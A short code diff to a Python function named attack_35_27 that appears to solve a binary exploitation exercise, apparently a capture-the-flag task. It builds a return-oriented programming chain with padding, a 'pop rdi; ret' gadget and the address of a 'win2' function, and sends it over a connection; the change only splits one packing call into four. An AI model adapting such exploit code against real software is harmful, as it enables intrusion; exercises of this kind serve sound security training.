@@ -17,7 +17,10 @@ def attack_35_27(conn, **kwargs):
     rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])
     print(f"Found pop rdi; ret at: {hex(rdi_gadget.address)}")
     exploit =  b'a' * 0x10
-    exploit += struct.pack('<QQQQ', 0xdeadbeef, rdi_gadget.address, 0xcafebabe, binf.functions['win2'].address)
+    exploit += struct.pack('<Q', 0xdeadbeef)
+    exploit += struct.pack('<Q', rdi_gadget.address)
+    exploit += struct.pack('<Q', 0xcafebabe)
+    exploit += struct.pack('<Q', binf.functions['win2'].address)
     conn.sendline(exploit)
     print(conn.recvall().decode())
 
